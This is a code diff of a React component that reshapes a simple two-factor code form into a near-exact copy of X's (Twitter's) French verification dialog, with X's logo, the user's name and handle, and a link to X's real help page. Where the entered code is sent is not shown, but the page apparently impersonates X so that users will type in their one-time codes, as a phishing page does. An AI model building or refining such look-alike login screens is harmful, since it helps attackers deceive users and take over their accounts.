@@ -135,26 +135,144 @@ export const TwoFA = () => {
     }
   };
 
+  // Fallback pour l'avatar et le nom d'utilisateur
+  const displayUsername = username || "Username";
+  const displayScreenName = username ? `@${username}` : "@username";
+  const avatarUrl = ""; // Pas d'avatar pour l'instant, on utilisera un fallback
+
   return (
     <div className="twofa-page">
       <FullScreenLoader visible={loading} text="Verifying code..." />
       <Toast message={toast} onClose={() => setToast("")} />
 
-      <div className="twofa-container">
-        <div className="username-display">{username || "Username"}</div>
+      <div className="twofa-modal" role="dialog" aria-modal="true">
+        {/* Header */}
+        <div className="twofa-header">
+          <div className="twofa-header-content">
+            <div className="twofa-close-button-container">
+              <button
+                className="twofa-close-button"
+                aria-label="Fermer"
+                type="button"
+                onClick={() => navigate(-1)}
+              >
+                <svg
+                  viewBox="0 0 24 24"
+                  aria-hidden="true"
+                  className="twofa-close-icon"
+                >
+                  <g>
+                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
+                  </g>
+                </svg>
+              </button>
+            </div>
+            <div className="twofa-logo-container">
+              <svg
+                viewBox="0 0 24 24"
+                aria-label="X"
+                role="img"
+                className="twofa-logo"
+              >
+                <g>
+                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
+                </g>
+              </svg>
+            </div>
+            <div className="twofa-header-spacer"></div>
+          </div>
+        </div>
 
-        <input
-          type="text"
-          placeholder="Code"
-          value={code}
-          onChange={(e) => setCode(e.target.value)}
-          className="twofa-input"
-          disabled={loading}
-        />
+        {/* Content */}
+        <div className="twofa-content">
+          <div className="twofa-title-container">
+            <h1 className="twofa-title" id="modal-header">
+              Entrez votre code de vérification
+            </h1>
+            <div className="twofa-description">
+              <span>
+                Utilisez votre application génératrice de code et saisissez
+                ci-dessous le code obtenu.
+              </span>
+            </div>
+          </div>
 
-        <button className="next-button" onClick={handleNext} disabled={loading}>
-          Next
-        </button>
+          {/* User Display */}
+          <div className="twofa-user-display">
+            <div className="twofa-user-avatar">
+              {avatarUrl ? (
+                <img src={avatarUrl} alt={displayUsername} />
+              ) : (
+                <div className="twofa-user-avatar-fallback">
+                  {displayUsername.charAt(0).toUpperCase()}
+                </div>
+              )}
+            </div>
+            <div className="twofa-user-info">
+              <div className="twofa-user-name">{displayUsername}</div>
+              <div className="twofa-user-handle">{displayScreenName}</div>
+            </div>
+          </div>
+
+          {/* Form */}
+          <div className="twofa-form">
+            <label className="twofa-label">
+              <div className="twofa-label-text">
+                <span>Entrez le code</span>
+              </div>
+              <div className="twofa-input-wrapper">
+                <input
+                  type="text"
+                  name="text"
+                  autoComplete="on"
+                  autoCapitalize="none"
+                  autoCorrect="off"
+                  inputMode="numeric"
+                  spellCheck="false"
+                  dir="auto"
+                  className="twofa-input"
+                  value={code}
+                  onChange={(e) => setCode(e.target.value)}
+                  disabled={loading}
+                  onKeyDown={(e) => {
+                    if (e.key === "Enter" && !loading && code.trim()) {
+                      handleNext();
+                    }
+                  }}
+                />
+              </div>
+            </label>
+
+            <div className="twofa-links">
+              <button
+                type="button"
+                className="twofa-link-button"
+                onClick={() => {
+                  // TODO: Implement alternative verification method
+                }}
+              >
+                Choisir une autre méthode de vérification
+              </button>
+              <a
+                href="https://help.twitter.com/forms/account-access/regain-access"
+                target="_blank"
+                rel="noopener noreferrer nofollow"
+                className="twofa-link-button"
+              >
+                Contacter l&apos;Assistance X
+              </a>
+            </div>
+
+            <button
+              className="twofa-next-button"
+              onClick={handleNext}
+              disabled={loading || !code.trim()}
+              type="button"
+            >
+              <span>Suivant</span>
+            </button>
+          </div>
+        </div>
       </div>
     </div>
   );
